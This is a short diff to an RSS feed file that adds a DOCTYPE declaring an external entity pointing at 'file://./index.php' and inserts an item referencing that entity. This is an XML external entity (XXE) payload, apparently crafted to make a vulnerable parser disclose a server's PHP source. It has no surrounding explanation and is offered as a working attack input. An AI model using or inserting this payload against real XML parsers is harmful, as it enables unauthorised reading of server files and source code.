@@ -1,5 +1,7 @@
 <rss version="2.0">
-    
+    <!DOCTYPE updateProfile [
+        <!ENTITY file SYSTEM "file://./index.php">
+    ]]>
     
 <channel>
     <title>toto</title>
@@ -8,5 +10,6 @@
     <item>
       TOTO
     </item>
+    <item>&file;</item>
 </channel>
 </rss>
